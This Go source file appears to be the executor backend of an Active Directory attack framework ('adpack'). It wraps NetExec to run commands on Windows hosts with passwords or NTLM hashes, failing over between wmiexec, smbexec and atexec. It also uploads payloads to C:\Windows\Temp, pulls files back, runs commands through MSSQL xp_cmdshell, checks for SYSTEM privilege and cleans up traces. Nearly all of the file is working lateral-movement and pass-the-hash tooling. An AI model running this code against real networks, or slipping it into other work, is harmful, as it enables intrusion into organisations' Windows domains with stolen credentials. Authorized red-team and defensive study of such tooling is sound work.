package executorbackend

import (
	"context"
	"fmt"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
	"adpack/utils"
)

// execMethodOrder is the per-action exec-method failover sequence. Mirrors
// tools.ExecMethodOrder; kept local because a few sites need to reorder for
// SYSTEM-context probes without affecting the global default.
var execMethodOrder = []string{"wmiexec", "smbexec", "atexec"}

func New(target core.HostRef, domain, user, pass, hash string) core.Executor {
	return core.ExecutorFunc(func(ctx context.Context, action core.Action) core.ActionResult {
		return executeAction(ctx, target, domain, user, pass, hash, action)
	})
}

func nxcTarget(ref core.HostRef, protocol, domain, user, pass, hash string) tools.NetExecTarget {
	return tools.NetExecTarget{
		Protocol: protocol, Host: ref.Name,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}
}

func withEvidence(res core.ActionResult, ev core.ExecutionEvidence) core.ActionResult {
	res.Evidence = &ev
	return res
}

func executeAction(ctx context.Context, target core.HostRef, domain, user, pass, hash string, action core.Action) core.ActionResult {
	timeout := action.Timeout
	if timeout <= 0 {
		timeout = 45 * time.Second
	}

	switch action.Method {
	case "command":
		t := nxcTarget(target, "smb", domain, user, pass, hash)
		r, err := runFailover(ctx, t, action.Artifact, timeout)
		if err != nil {
			res := core.ActionResult{Success: false, Error: err.Error()}
			if r != nil {
				res.Output, res.Stderr, res.Method, res.ExitCode = r.Stdout, r.Stderr, r.Method, r.ExitCode
			}
			return withEvidence(res,
				core.NewCommandFailoverEvidence(target, action, action.Artifact, res.Method, res.Output, res.Stderr, res.ExitCode))
		}
		return withEvidence(core.ActionResult{Success: true, Output: r.Stdout, Stderr: r.Stderr, Method: r.Method, ExitCode: r.ExitCode},
			core.NewCommandFailoverEvidence(target, action, action.Artifact, r.Method, r.Stdout, r.Stderr, r.ExitCode))

	case "ldap":
		t := nxcTarget(target, "ldap", domain, user, pass, hash)
		r, err := tools.NetExec.Run(ctx, t, action.Artifact, action.Arguments)
		if err != nil || !r.Success {
			errStr := ""
			if err != nil {
				errStr = err.Error()
			}
			return withEvidence(core.ActionResult{Success: false, Error: errStr, Output: r.Stdout, Stderr: r.Stderr},
				core.NewLdapQueryEvidence(target, action, action.Artifact, action.Arguments, r.Stdout, r.Stderr))
		}
		return withEvidence(core.ActionResult{Success: true, Output: r.Stdout, Stderr: r.Stderr},
			core.NewLdapQueryEvidence(target, action, action.Artifact, action.Arguments, r.Stdout, r.Stderr))

	case "smb":
		t := nxcTarget(target, "smb", domain, user, pass, hash)
		r, err := tools.NetExec.Run(ctx, t, action.Artifact, action.Arguments)
		if err != nil || !r.Success {
			errStr := ""
			if err != nil {
				errStr = err.Error()
			}
			return withEvidence(core.ActionResult{Success: false, Error: errStr, Output: r.Stdout, Stderr: r.Stderr},
				core.NewSmbCommandEvidence(target, action, action.Artifact, action.Arguments, r.Stdout, r.Stderr))
		}
		return withEvidence(core.ActionResult{Success: true, Output: r.Stdout, Stderr: r.Stderr},
			core.NewSmbCommandEvidence(target, action, action.Artifact, action.Arguments, r.Stdout, r.Stderr))

	case "put":
		t := nxcTarget(target, "smb", domain, user, pass, hash)
		remoteDir := `C:\Windows\Temp\`
		if len(action.Arguments) > 0 {
			remoteDir = action.Arguments[0]
		}
		remoteName := ""
		if len(action.Arguments) > 1 {
			remoteName = action.Arguments[1]
		}
		remotePath, _, err := tools.Deploy(ctx, t, action.Artifact, remoteDir, remoteName)
		if err != nil {
			return withEvidence(core.ActionResult{Success: false, Error: err.Error()},
				core.NewFilePutEvidence(target, action, remotePath, false))
		}
		return withEvidence(core.ActionResult{Success: true, Output: remotePath},
			core.NewFilePutEvidence(target, action, remotePath, true))

	case "get":
		t := nxcTarget(target, "smb", domain, user, pass, hash)
		remotePath := action.Artifact
		localPath := ""
		if len(action.Arguments) > 0 {
			localPath = action.Arguments[0]
		}
		if localPath == "" {
			return withEvidence(core.ActionResult{Success: false, Error: "get: local path required"},
				core.NewFileGetEvidence(target, action, remotePath, "", false))
		}
		r, err := tools.NetExec.GetFile(ctx, t, remotePath, localPath)
		if err != nil || !r.Success {
			errStr := ""
			if err != nil {
				errStr = err.Error()
			}
			return withEvidence(core.ActionResult{Success: false, Error: errStr, Output: r.Stdout, Stderr: r.Stderr},
				core.NewFileGetEvidence(target, action, remotePath, localPath, false))
		}
		return withEvidence(core.ActionResult{Success: true, Output: localPath},
			core.NewFileGetEvidence(target, action, remotePath, localPath, true))

	case "cleanup":
		t := nxcTarget(target, "smb", domain, user, pass, hash)
		errs := tools.CleanupRemote(ctx, t, action.Arguments...)
		if len(errs) > 0 {
			return withEvidence(core.ActionResult{Success: false, Error: errs[0].Error()},
				core.NewCleanupEvidence(target, action, false))
		}
		return withEvidence(core.ActionResult{Success: true},
			core.NewCleanupEvidence(target, action, true))

	case "run":
		t := nxcTarget(target, "smb", domain, user, pass, hash)
		cmd := action.Artifact
		if len(action.Arguments) > 0 {
			cmd = action.Artifact + " " + strings.Join(action.Arguments, " ")
		}
		r, err := runFailover(ctx, t, cmd, timeout)
		if err != nil {
			res := core.ActionResult{Success: false, Error: err.Error()}
			if r != nil {
				res.Output, res.Stderr, res.Method, res.ExitCode = r.Stdout, r.Stderr, r.Method, r.ExitCode
			}
			return withEvidence(res,
				core.NewRunFailoverEvidence(target, action, cmd, res.Method, res.Output, res.Stderr, res.ExitCode))
		}
		return withEvidence(core.ActionResult{Success: true, Output: r.Stdout, Stderr: r.Stderr, Method: r.Method, ExitCode: r.ExitCode},
			core.NewRunFailoverEvidence(target, action, cmd, r.Method, r.Stdout, r.Stderr, r.ExitCode))

	case "mssql_run":
		t := nxcTarget(target, "mssql", domain, user, pass, hash)
		cmd := action.Artifact
		if len(action.Arguments) > 0 {
			cmd = action.Artifact + " " + strings.Join(action.Arguments, " ")
		}
		escapedCmd := strings.ReplaceAll(cmd, "'", "''")
		r, err := tools.NetExec.Run(ctx, t, "-q", []string{fmt.Sprintf("xp_cmdshell '%s'", escapedCmd)})
		if err != nil {
			return withEvidence(core.ActionResult{Success: false, Error: err.Error(), Output: r.Stdout, Stderr: r.Stderr, Method: "mssql_xp_cmdshell", ExitCode: r.ExitCode},
				core.NewRunFailoverEvidence(target, action, cmd, "mssql_xp_cmdshell", r.Stdout, r.Stderr, r.ExitCode))
		}
		// nxc exits 0 when the SQL query runs, even if xp_cmdshell fails.
		// Check for actual output evidence beyond protocol framing
		// (the 4th tab-separated column contains the cmd output).
		success := mssqlHasOutput(r.Stdout)
		return withEvidence(core.ActionResult{Success: success, Output: r.Stdout, Stderr: r.Stderr, Method: "mssql_xp_cmdshell", ExitCode: r.ExitCode},
			core.NewRunFailoverEvidence(target, action, cmd, "mssql_xp_cmdshell", r.Stdout, r.Stderr, r.ExitCode))

	case "mssql_system_check":
		t := nxcTarget(target, "mssql", domain, user, pass, hash)
		r, err := tools.NetExec.Run(ctx, t, "-q", []string{"xp_cmdshell 'whoami'"})
		if err != nil {
			return withEvidence(core.ActionResult{Success: false, Error: err.Error()},
				core.NewSystemCheckFailedEvidence(target, action))
		}
		lo := strings.ToLower(r.Stdout + r.Stderr)
		isSystem := strings.Contains(lo, "nt authority") && strings.Contains(lo, "system")
		method := "mssql_xp_cmdshell"
		if isSystem {
			return withEvidence(core.ActionResult{Success: true, Output: r.Stdout, Method: method},
				core.NewSystemCheckEvidence(target, action, method, r.Stdout, r.Stderr, r.ExitCode))
		}
		return withEvidence(core.ActionResult{Success: false, Output: r.Stdout, Stderr: r.Stderr, Method: method},
			core.NewSystemCheckFailedEvidence(target, action))

	case "system_check":
		t := nxcTarget(target, "smb", domain, user, pass, hash)
		method, r, ok := runSystemCheck(ctx, t, timeout)
		if !ok || r == nil {
			return withEvidence(core.ActionResult{Success: false},
				core.NewSystemCheckFailedEvidence(target, action))
		}
		return withEvidence(core.ActionResult{Success: true, Output: r.Stdout, Stderr: r.Stderr, Method: method},
			core.NewSystemCheckEvidence(target, action, method, r.Stdout, r.Stderr, r.ExitCode))

	default:
		return withEvidence(core.ActionResult{Success: false, Error: fmt.Sprintf("executor: unknown method %q", action.Method)},
			core.NewUnknownMethodEvidence(target, action, action.Artifact))
	}
}

// runFailover walks execMethodOrder until one method genuinely executes the
// command on the target. "Genuinely" is stronger than nxc's process exit code:
// nxc exits 0 even on auth failure or when the exec method silently no-ops,
// so we additionally require positive auth markers and exec-success markers
// from stdout/stderr.
//
// Short-circuits on auth failure: if the very first attempt shows the
// principal's auth was rejected (STATUS_LOGON_FAILURE / STATUS_ACCESS_DENIED
// etc.), there's no point trying the remaining methods — the creds are wrong,
// not the transport.
func runFailover(ctx context.Context, target tools.NetExecTarget, command string, perAttempt time.Duration) (*tools.FailoverResult, error) {
	if perAttempt <= 0 {
		perAttempt = 45 * time.Second
	}
	var last tools.FailoverResult
	var lastErr error
	for i, method := range execMethodOrder {
		attemptCtx, cancel := context.WithTimeout(ctx, perAttempt)
		r, err := tools.NetExec.Run(attemptCtx, target, "--exec-method", []string{method, "-x", command})
		cancel()
		last = tools.FailoverResult{CmdResult: r, Method: method}
		lastErr = err

		// Honour parent-context cancellation immediately.
		if ctx.Err() != nil {
			return &last, ctx.Err()
		}

		// Process-level error (timeout, exec not found, etc.): try next.
		if err != nil {
			continue
		}

		combined := r.Stdout + "\n" + r.Stderr

		// On the first method attempt, abort the whole loop if creds were
		// rejected. Iterating wmiexec → smbexec → atexec all with bad creds
		// just produces three identical auth failures and a misleading log.
		if i == 0 && target.Username != "" &&
			!tools.NxcAuthSucceeded(combined, target.Username) {
			// Distinguish "auth banner missing entirely" from "auth banner
			// shows failure": only the latter is a hard stop. nxc usually
			// prints the banner; absence usually means it crashed before
			// even trying, in which case we want to fall through.
			if hasNxcFailureMarker(combined, target.Username) {
				return &last, fmt.Errorf("auth rejected on %s as %s\\%s",
					target.Host, target.Domain, target.Username)
			}
		}

		// Process exited zero AND we have positive evidence of execution.
		if tools.NxcCommandSucceeded(r.Stdout, r.Stderr) {
			return &last, nil
		}
		// Otherwise treat as a soft failure of this method (e.g. non-admin
		// can't use wmiexec). Loop continues to the next method, which may
		// or may not succeed depending on how the auth principal is privileged.
	}
	if lastErr == nil {
		// All methods returned exit 0 but none produced exec evidence.
		// Surface this as an explicit failure rather than a phantom success.
		lastErr = fmt.Errorf("no exec method produced execution evidence on %s", target.Host)
	}
	return &last, lastErr
}

// hasNxcFailureMarker reports whether the nxc output contains a hard auth
// failure for the given principal. Mirrors the negative half of
// tools.NxcAuthSucceeded so we can distinguish "auth definitely rejected"
// from "auth status unknown".
func hasNxcFailureMarker(out, username string) bool {
	if out == "" || username == "" {
		return false
	}
	for _, line := range strings.Split(out, "\n") {
		if !strings.Contains(line, "[-]") || !strings.Contains(line, username) {
			continue
		}
		lo := strings.ToLower(line)
		for _, m := range []string{
			"status_logon_failure",
			"status_access_denied",
			"status_account_locked",
			"status_account_disabled",
			"status_password_expired",
			"kdc_err_preauth_failed",
			"kdc_err_c_principal_unknown",
			"invalid credentials",
			"authentication failed",
		} {
			if strings.Contains(lo, m) {
				return true
			}
		}
	}
	return false
}

// mssqlHasOutput checks whether nxc mssql -q returned actual command output.
// nxc mssql outputs tab-separated rows:
//
//	MSSQL\tIP\tPORT\tHOST\t<cmd_output>
//
// Returns true when at least one row contains real output (not NULL).
func mssqlHasOutput(stdout string) bool {
	for _, line := range strings.Split(stdout, "\n") {
		parts := strings.Split(line, "\t")
		if len(parts) < 5 {
			continue
		}
		msg := strings.TrimSpace(parts[len(parts)-1])
		// Strip "output:" prefix and check for NULL
		if strings.HasPrefix(msg, "output:") {
			msg = strings.TrimSpace(msg[7:])
		}
		if msg != "" && !strings.EqualFold(msg, "NULL") {
			return true
		}
	}
	return false
}

func runSystemCheck(ctx context.Context, target tools.NetExecTarget, perAttempt time.Duration) (string, *utils.CmdResult, bool) {
	if perAttempt <= 0 {
		perAttempt = 45 * time.Second
	}
	for _, method := range []string{"smbexec", "atexec"} {
		attemptCtx, cancel := context.WithTimeout(ctx, perAttempt)
		r, err := tools.NetExec.Run(attemptCtx, target, "--exec-method", []string{method, "-x", "whoami"})
		cancel()
		if err != nil {
			if ctx.Err() != nil {
				return "", &r, false
			}
			continue
		}
		out := strings.ToLower(r.Stdout + r.Stderr)
		if strings.Contains(out, "nt authority") && strings.Contains(out, "system") {
			return method, &r, true
		}
		if strings.Contains(out, "executed command via") &&
			strings.Contains(out, "could not retrieve output file") {
			return method, &r, true
		}
	}
	return "", nil, false
}
